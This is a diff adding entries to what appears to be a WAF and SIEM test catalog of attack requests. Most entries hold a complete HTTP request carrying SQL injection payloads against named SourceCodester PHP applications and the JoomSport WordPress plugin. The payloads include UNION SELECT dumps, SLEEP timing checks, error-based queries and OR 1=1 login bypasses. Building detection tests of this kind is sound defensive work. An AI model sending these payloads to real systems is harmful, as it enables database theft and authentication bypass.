@@ -389705,6 +389705,484 @@
     "visible": true
   },
   {
+    "name": "CVE-2022-2722 - SourceCodester Simple Student Information System SQL Injection",
+    "displayName": "CVE-2022-2722 - SourceCodester Simple Student Information System SQL Injection",
+    "description": "SourceCodester Simple Student Information System is vulnerable to SQL injection via the 'id' argument of manage_course.php (VulDB VDB-205835). The request sends a UNION SELECT payload in id, matching OWASP CRS 942 SQLi. HTTP method inferred as GET (id is a record-selector parameter); path taken from the VulDB-named file. No vendor WAF rule found; built from the VulDB entry.\n\nReferences used to recreate this request:\n- https://vuldb.com/?id.205835 (VulDB entry / entry point)\n- https://bewhale.github.io/post/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E2%80%94Simple%20Student%20Information%20System%20manage_course.php%20SQL%20Injection/ (PoC write-up, provenance-blocked at build time)\n- https://www.cve.org/CVERecord?id=CVE-2022-2722 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /manage_course.php?id=-1%27%20UNION%20ALL%20SELECT%20NULL%2Cdatabase%28%29%2Cuser%28%29%2CNULL--%20- HTTP/1.1\nHost: {{target_host}}\nCookie: PHPSESSID=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2022-2722"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_vuldb for CVE-2022-2722",
+        "link": "https://vuldb.com/?id.205835"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2022-2718 - beardev JoomSport for WordPress SQL Injection",
+    "displayName": "CVE-2022-2718 - beardev JoomSport for WordPress SQL Injection",
+    "description": "The JoomSport WordPress plugin (<=5.2.5) is vulnerable to authenticated (admin) SQL injection via the 'orderby' parameter on the joomsport-page-extrafields admin page. The request sends a time-based SQLi payload in orderby, matching OWASP CRS 942 SQLi. Admin session cookie is a dummy value (the WAF inspects before the app authenticates). Method is GET (orderby is a list-table sort parameter); admin page served via /wp-admin/admin.php?page=. Source: Wordfence advisory.\n\nReferences used to recreate this request:\n- https://www.wordfence.com/threat-intel/vulnerabilities/id/9eee9bec-609a-468b-8b44-ac4af409df93?source=cve (advisory, parameter+page)\n- https://plugins.trac.wordpress.org/browser/joomsport-sports-league-results-management/trunk/includes/pages/joomsport-page-extrafields.php?rev=2540219#L26 (vulnerable source)\n- https://www.cve.org/CVERecord?id=CVE-2022-2718 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /wp-admin/admin.php?page=joomsport-page-extrafields&orderby=1%20AND%20%28SELECT%201%20FROM%28SELECT%20SLEEP%285%29%29a%29--%20- HTTP/1.1\nHost: {{target_host}}\nCookie: wordpress_logged_in_dummy=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2022-2718"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_wordfence for CVE-2022-2718",
+        "link": "https://www.wordfence.com/threat-intel/vulnerabilities/id/9eee9bec-609a-468b-8b44-ac4af409df93?source=cve"
+      },
+      {
+        "title": "fix_source for CVE-2022-2718",
+        "link": "https://plugins.trac.wordpress.org/browser/joomsport-sports-league-results-management/trunk/includes/pages/joomsport-page-extrafields.php?rev=2540219#L26"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2022-2717 - beardev JoomSport for WordPress SQL Injection",
+    "displayName": "CVE-2022-2717 - beardev JoomSport for WordPress SQL Injection",
+    "description": "The JoomSport WordPress plugin (<=5.2.5) is vulnerable to authenticated (admin) SQL injection via the 'orderby' parameter on the joomsport-events-form admin page (vulnerable source file joomsport-page-events.php). The request sends a time-based SQLi payload in orderby, matching OWASP CRS 942 SQLi. Admin session cookie is a dummy value. Method is GET (list-table sort parameter); admin page served via /wp-admin/admin.php?page=. Source: Wordfence advisory.\n\nReferences used to recreate this request:\n- https://www.wordfence.com/threat-intel/vulnerabilities/id/9b6cf4ab-9e4d-4fd7-9e9e-c678ccc4d810?source=cve (advisory, parameter+page)\n- https://plugins.trac.wordpress.org/browser/joomsport-sports-league-results-management/trunk/includes/pages/joomsport-page-events.php?rev=2679820#L28 (vulnerable source)\n- https://www.cve.org/CVERecord?id=CVE-2022-2717 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /wp-admin/admin.php?page=joomsport-events-form&orderby=1%20AND%20%28SELECT%201%20FROM%28SELECT%20SLEEP%285%29%29a%29--%20- HTTP/1.1\nHost: {{target_host}}\nCookie: wordpress_logged_in_dummy=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2022-2717"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_wordfence for CVE-2022-2717",
+        "link": "https://www.wordfence.com/threat-intel/vulnerabilities/id/9b6cf4ab-9e4d-4fd7-9e9e-c678ccc4d810?source=cve"
+      },
+      {
+        "title": "fix_source for CVE-2022-2717",
+        "link": "https://plugins.trac.wordpress.org/browser/joomsport-sports-league-results-management/trunk/includes/pages/joomsport-page-events.php?rev=2679820#L28"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2022-2715 - SourceCodester Employee Management System SQL Injection",
+    "displayName": "CVE-2022-2715 - SourceCodester Employee Management System SQL Injection",
+    "description": "SourceCodester Employee Management System is vulnerable to SQL injection via the 'id' argument of eloginwel.php (VulDB VDB-205834). The request sends a UNION SELECT payload in id, matching OWASP CRS 942 SQLi. HTTP method inferred as GET (id is a record-selector parameter); path from the VulDB-named file. The PoC PDF (vuls/vuls repo) was not reachable at build time. No vendor WAF rule found; built from the VulDB entry.\n\nReferences used to recreate this request:\n- https://vuldb.com/?id.205834 (VulDB entry / entry point)\n- https://github.com/vuls/vuls/blob/main/Employee%20Management%20System/Employee%20Management%20System%20eloginwel.php%20SQL%20Injection.pdf (PoC, not reachable at build time)\n- https://www.cve.org/CVERecord?id=CVE-2022-2715 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /eloginwel.php?id=-1%27%20UNION%20ALL%20SELECT%20NULL%2Cdatabase%28%29%2Cuser%28%29--%20- HTTP/1.1\nHost: {{target_host}}\nCookie: PHPSESSID=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2022-2715"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_vuldb for CVE-2022-2715",
+        "link": "https://vuldb.com/?id.205834"
+      },
+      {
+        "title": "poc_github for CVE-2022-2715",
+        "link": "https://github.com/vuls/vuls/blob/main/Employee%20Management%20System/Employee%20Management%20System%20eloginwel.php%20SQL%20Injection.pdf"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2022-2708 - SourceCodester Gym Management System SQL Injection",
+    "displayName": "CVE-2022-2708 - SourceCodester Gym Management System SQL Injection",
+    "description": "SourceCodester Gym Management System is vulnerable to SQL injection via the 'user_login' argument of login.php (VulDB VDB-205833). The request sends the exact error-based SQLi payload from the VulDB entry in user_login, matching OWASP CRS 942 SQLi. HTTP method inferred as POST (login form submission); path from the VulDB-named file. No vendor WAF rule found; built from the VulDB entry.\n\nReferences used to recreate this request:\n- https://vuldb.com/?id.205833 (VulDB entry / entry point + payload)\n- https://www.cve.org/CVERecord?id=CVE-2022-2708 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /login.php HTTP/1.1\nHost: {{target_host}}\nContent-Type: application/x-www-form-urlencoded\nCookie: PHPSESSID=dummy\n\nuser_login=123%40xx.com%27+OR+%28SELECT+9084+FROM%28SELECT+COUNT%28%2A%29%2CCONCAT%280x7178767871%2C%28SELECT+%28ELT%289084%3D9084%2C1%29%29%29%2C0x71767a6271%2CFLOOR%28RAND%280%29%2A2%29%29x+FROM+INFORMATION_SCHEMA.PLUGINS+GROUP+BY+x%29a%29--+dPvW\n"
+    },
+    "cves": [
+      "CVE-2022-2708"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_vuldb for CVE-2022-2708",
+        "link": "https://vuldb.com/?id.205833"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2022-2707 - SourceCodester Online Class and Exam Scheduling System SQL Injection",
+    "displayName": "CVE-2022-2707 - SourceCodester Online Class and Exam Scheduling System SQL Injection",
+    "description": "SourceCodester Online Class and Exam Scheduling System 1.0 is vulnerable to SQL injection via the 'faculty' argument of /pages/faculty_sched.php (VulDB VDB-205831). The request sends the exact error-based SQLi payload from the VulDB entry in faculty, matching OWASP CRS 942 SQLi. HTTP method inferred as GET (schedule-view selector parameter). PoC: anx0ing/CVE_demo. No vendor WAF rule found.\n\nReferences used to recreate this request:\n- https://github.com/anx0ing/CVE_demo/blob/main/2022/Online%20Class%20and%20Exam%20Scheduling%20System-SQL%20injections.md (PoC)\n- https://vuldb.com/?id.205831 (VulDB entry + payload)\n- https://www.cve.org/CVERecord?id=CVE-2022-2707 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /pages/faculty_sched.php?faculty=%27%20OR%20%28SELECT%202078%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x716a717071%2C%28SELECT%20%28ELT%282078%3D2078%2C1%29%29%29%2C0x717a706a71%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x%29a%29--%20uYCM HTTP/1.1\nHost: {{target_host}}\nCookie: PHPSESSID=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2022-2707"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2022-2707",
+        "link": "https://github.com/anx0ing/CVE_demo/blob/main/2022/Online%20Class%20and%20Exam%20Scheduling%20System-SQL%20injections.md"
+      },
+      {
+        "title": "poc_vuldb for CVE-2022-2707",
+        "link": "https://vuldb.com/?id.205831"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2022-2706 - SourceCodester Online Class and Exam Scheduling System SQL Injection",
+    "displayName": "CVE-2022-2706 - SourceCodester Online Class and Exam Scheduling System SQL Injection",
+    "description": "SourceCodester Online Class and Exam Scheduling System 1.0 is vulnerable to SQL injection via the 'class' argument of /pages/class_sched.php (VulDB VDB-205830). The request sends the exact error-based SQLi payload from the VulDB entry in class, matching OWASP CRS 942 SQLi. HTTP method inferred as GET (schedule-view selector parameter). PoC: anx0ing/CVE_demo. No vendor WAF rule found.\n\nReferences used to recreate this request:\n- https://github.com/anx0ing/CVE_demo/blob/main/2022/Online%20Class%20and%20Exam%20Scheduling%20System-SQL%20injections.md (PoC)\n- https://vuldb.com/?id.205830 (VulDB entry + payload)\n- https://www.cve.org/CVERecord?id=CVE-2022-2706 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /pages/class_sched.php?class=%27%7C%7C%28SELECT%200x684d6b6c%20WHERE%205993%3D5993%20AND%20%28SELECT%202096%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x717a786b71%2C%28SELECT%20%28ELT%282096%3D2096%2C1%29%29%29%2C0x717a626271%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x%29a%29%29%7C%7C%27 HTTP/1.1\nHost: {{target_host}}\nCookie: PHPSESSID=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2022-2706"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2022-2706",
+        "link": "https://github.com/anx0ing/CVE_demo/blob/main/2022/Online%20Class%20and%20Exam%20Scheduling%20System-SQL%20injections.md"
+      },
+      {
+        "title": "poc_vuldb for CVE-2022-2706",
+        "link": "https://vuldb.com/?id.205830"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2022-2705 - SourceCodester Simple Student Information System SQL Injection",
+    "displayName": "CVE-2022-2705 - SourceCodester Simple Student Information System SQL Injection",
+    "description": "SourceCodester Simple Student Information System is vulnerable to SQL injection via the 'id' argument of admin/departments/manage_department.php (VulDB VDB-205829). The request sends the exact UNION SELECT payload from the VulDB entry in id, matching OWASP CRS 942 SQLi. HTTP method inferred as GET (id is a record-selector parameter). No vendor WAF rule found; built from the VulDB entry.\n\nReferences used to recreate this request:\n- https://vuldb.com/?id.205829 (VulDB entry / entry point + payload)\n- https://bewhale.github.io/post/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E2%80%94Simple%20Student%20Information%20System/ (PoC write-up, provenance-blocked at build time)\n- https://www.cve.org/CVERecord?id=CVE-2022-2705 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /admin/departments/manage_department.php?id=-5756%27%20UNION%20ALL%20SELECT%20NULL%2Cdatabase%28%29%2Cuser%28%29%2CNULL%2CNULL%2CNULL%2CNULL--%20- HTTP/1.1\nHost: {{target_host}}\nCookie: PHPSESSID=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2022-2705"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_vuldb for CVE-2022-2705",
+        "link": "https://vuldb.com/?id.205829"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2022-2699 - SourceCodester Simple E-Learning System SQL Injection",
+    "displayName": "CVE-2022-2699 - SourceCodester Simple E-Learning System SQL Injection",
+    "description": "SourceCodester Simple E-Learning System is vulnerable to SQL injection via the 'phoneNumber' argument of the /claire_blake personal-data endpoint (VulDB VDB-205820). The request sends a time-based SQLi payload in phoneNumber, matching OWASP CRS 942 SQLi. HTTP method inferred as POST (personal data modification); path and parameter taken from the VulDB entry. PoC PDF (E1CHO/water_cve) not reachable at build time.\n\nReferences used to recreate this request:\n- https://vuldb.com/?id.205820 (VulDB entry / entry point)\n- https://github.com/E1CHO/water_cve/blob/main/E-learning%20System%20personal%20data%20modification%20SQl%20vulnerability.pdf (PoC, not reachable at build time)\n- https://www.cve.org/CVERecord?id=CVE-2022-2699 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /claire_blake HTTP/1.1\nHost: {{target_host}}\nContent-Type: application/x-www-form-urlencoded\nCookie: PHPSESSID=dummy\n\nphoneNumber=1%27+OR+SLEEP%285%29--+-\n"
+    },
+    "cves": [
+      "CVE-2022-2699"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_vuldb for CVE-2022-2699",
+        "link": "https://vuldb.com/?id.205820"
+      },
+      {
+        "title": "poc_github for CVE-2022-2699",
+        "link": "https://github.com/E1CHO/water_cve/blob/main/E-learning%20System%20personal%20data%20modification%20SQl%20vulnerability.pdf"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2022-2698 - SourceCodester Simple E-Learning System SQL Injection",
+    "displayName": "CVE-2022-2698 - SourceCodester Simple E-Learning System SQL Injection",
+    "description": "SourceCodester Simple E-Learning System is vulnerable to SQL injection via the 'searchPost' argument of search.php (VulDB VDB-205819, class comment query). The request sends a UNION SELECT payload in searchPost, matching OWASP CRS 942 SQLi. HTTP method inferred as POST (searchPost is a form-posted search field); path and parameter from the VulDB entry. PoC PDF (E1CHO/water_cve) not reachable at build time.\n\nReferences used to recreate this request:\n- https://vuldb.com/?id.205819 (VulDB entry / entry point)\n- https://github.com/E1CHO/water_cve/blob/main/E-learning%20System%20Class%20comment%20query%20SQl%20vulnerability.pdf (PoC, not reachable at build time)\n- https://www.cve.org/CVERecord?id=CVE-2022-2698 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /search.php HTTP/1.1\nHost: {{target_host}}\nContent-Type: application/x-www-form-urlencoded\nCookie: PHPSESSID=dummy\n\nsearchPost=%27+UNION+SELECT+NULL%2CNULL%2CNULL--+-\n"
+    },
+    "cves": [
+      "CVE-2022-2698"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_vuldb for CVE-2022-2698",
+        "link": "https://vuldb.com/?id.205819"
+      },
+      {
+        "title": "poc_github for CVE-2022-2698",
+        "link": "https://github.com/E1CHO/water_cve/blob/main/E-learning%20System%20Class%20comment%20query%20SQl%20vulnerability.pdf"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
     "name": "CVE-2026-5681 - itsourcecode Equipment/Inventory System SQL Injection",
     "displayName": "CVE-2026-5681 - itsourcecode Equipment/Inventory System SQL Injection",
     "description": "itsourcecode 1.0 is vulnerable to SQL injection in the emp_id parameter of /borrowedequip.php (Parameter Handler). The request sends a UNION SELECT payload in emp_id. No vendor WAF rule found; built from the VulDB advisory description. Method inferred as GET (id-style selector parameter); flagged as an inference.\n\nReferences used to recreate this request:\n- https://vuldb.com/vuln/355508 (VulDB advisory, file+argument entry point)\n- https://github.com/ltranquility/submit/issues/6 (PoC, GitHub fetch blocked)\n- https://www.cve.org/CVERecord?id=CVE-2026-5681 (CVE record)",
@@ -390779,6 +391257,488 @@
       {
         "title": "poc_vuldb for CVE-2022-2671",
         "link": "https://vuldb.com/?id.205655"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2022-2667 - SourceCodester Loan Management System SQL Injection",
+    "displayName": "CVE-2022-2667 - SourceCodester Loan Management System SQL Injection",
+    "description": "SourceCodester Loan Management System is vulnerable to SQL injection in the lplan_id argument of the file delete_lplan.php (VDB-205619). The request sends a time-based SQL injection (SLEEP) in lplan_id. HTTP method GET inferred (id/delete-style parameter); no vendor WAF rule found, built from the VulDB entry point and PoC repo.\n\nReferences used to recreate this request:\n- https://github.com/cxaqhq/Loan-Management-System-Sqlinjection (PoC)\n- https://vuldb.com/?id.205619 (VulDB entry point)\n- https://www.cve.org/CVERecord?id=CVE-2022-2667 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /delete_lplan.php?lplan_id=1%20AND%20(SELECT%201%20FROM%20(SELECT(SLEEP(5)))x)--%20- HTTP/1.1\nHost: {{target_host}}\nCookie: PHPSESSID=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2022-2667"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2022-2667",
+        "link": "https://github.com/cxaqhq/Loan-Management-System-Sqlinjection"
+      },
+      {
+        "title": "vuldb for CVE-2022-2667",
+        "link": "https://vuldb.com/?id.205619"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2022-2666 - SourceCodester Loan Management System SQL Injection",
+    "displayName": "CVE-2022-2666 - SourceCodester Loan Management System SQL Injection",
+    "description": "SourceCodester Loan Management System is vulnerable to SQL injection in the username argument of login.php (VDB-205618). The request sends an OR 1=1 authentication-bypass payload in username. HTTP method POST inferred (login form). No vendor WAF rule found; built from the VulDB entry point and PoC repo.\n\nReferences used to recreate this request:\n- https://github.com/cxaqhq/Loan-Management-System-Sqlinjection (PoC)\n- https://vuldb.com/?id.205618 (VulDB entry point)\n- https://www.cve.org/CVERecord?id=CVE-2022-2666 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /login.php HTTP/1.1\nHost: {{target_host}}\nContent-Type: application/x-www-form-urlencoded\nCookie: PHPSESSID=dummy\n\nusername=admin%27%20OR%201%3D1--%20-&password=x\n"
+    },
+    "cves": [
+      "CVE-2022-2666"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2022-2666",
+        "link": "https://github.com/cxaqhq/Loan-Management-System-Sqlinjection"
+      },
+      {
+        "title": "vuldb for CVE-2022-2666",
+        "link": "https://vuldb.com/?id.205618"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2022-2665 - SourceCodester Simple E-Learning System SQL Injection",
+    "displayName": "CVE-2022-2665 - SourceCodester Simple E-Learning System SQL Injection",
+    "description": "SourceCodester Simple E-Learning System is vulnerable to SQL injection in the post_id argument of classroom.php (VDB-205615). The request sends a time-based SQL injection (SLEEP) in post_id. HTTP method GET inferred (id/view-style parameter). No PoC repo or vendor WAF rule found; built from the VulDB entry point.\n\nReferences used to recreate this request:\n- https://vuldb.com/?id.205615 (VulDB entry point)\n- https://www.cve.org/CVERecord?id=CVE-2022-2665 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /classroom.php?post_id=1%20AND%20(SELECT%201%20FROM%20(SELECT(SLEEP(5)))x)--%20- HTTP/1.1\nHost: {{target_host}}\nCookie: PHPSESSID=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2022-2665"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "vuldb for CVE-2022-2665",
+        "link": "https://vuldb.com/?id.205615"
+      },
+      {
+        "title": "cve_record for CVE-2022-2665",
+        "link": "https://www.cve.org/CVERecord?id=CVE-2022-2665"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2022-2656 - SourceCodester Multi Language Hotel Management Software SQL Injection",
+    "displayName": "CVE-2022-2656 - SourceCodester Multi Language Hotel Management Software SQL Injection",
+    "description": "SourceCodester Multi Language Hotel Management Software (Sparkz) is vulnerable to SQL injection in the email POST parameter of the login page login.php (VDB-205596). sqlmap confirmed the email POST parameter; the request sends an OR 1=1 authentication-bypass payload. The login endpoint login.php and the email/password/login form body are confirmed from the application source and the PoC. No vendor WAF rule found.\n\nReferences used to recreate this request:\n- https://github.com/gdianq/Sparkz-Hotel-Management-loginpage-Sqlinjection/blob/main/README.md (PoC, sqlmap POST email)\n- https://vuldb.com/?id.205596 (VulDB entry point)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /login.php HTTP/1.1\nHost: {{target_host}}\nContent-Type: application/x-www-form-urlencoded\nCookie: PHPSESSID=dummy\n\nemail=admin%27%20OR%201%3D1--%20-&password=1&login=\n"
+    },
+    "cves": [
+      "CVE-2022-2656"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2022-2656",
+        "link": "https://github.com/gdianq/Sparkz-Hotel-Management-loginpage-Sqlinjection/blob/main/README.md"
+      },
+      {
+        "title": "vuldb for CVE-2022-2656",
+        "link": "https://vuldb.com/?id.205596"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2022-2648 - SourceCodester Multi Language Hotel Management Software SQL Injection",
+    "displayName": "CVE-2022-2648 - SourceCodester Multi Language Hotel Management Software SQL Injection",
+    "description": "SourceCodester Multi Language Hotel Management Software (Sparkz) is vulnerable to SQL injection in the room_id argument (VDB-205595). The reservation page is reached as index.php?reservation&room_id= (confirmed from the application source, where the dashboard links to index.php?reservation&room_id=). The request sends a time-based SQL injection (SLEEP) in room_id. Method GET confirmed from source link. No vendor WAF rule found.\n\nReferences used to recreate this request:\n- https://github.com/gdianq/Sparkz-Hotel-Management-Sqlinjection/tree/main (PoC)\n- https://vuldb.com/?id.205595 (VulDB entry point)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /index.php?reservation&room_id=1%20AND%20(SELECT%201%20FROM%20(SELECT(SLEEP(5)))x)--%20- HTTP/1.1\nHost: {{target_host}}\nCookie: PHPSESSID=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2022-2648"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2022-2648",
+        "link": "https://github.com/gdianq/Sparkz-Hotel-Management-Sqlinjection/tree/main"
+      },
+      {
+        "title": "vuldb for CVE-2022-2648",
+        "link": "https://vuldb.com/?id.205595"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2022-2593 - Better Search Replace WordPress Plugin SQL Injection",
+    "displayName": "CVE-2022-2593 - Better Search Replace WordPress Plugin SQL Injection",
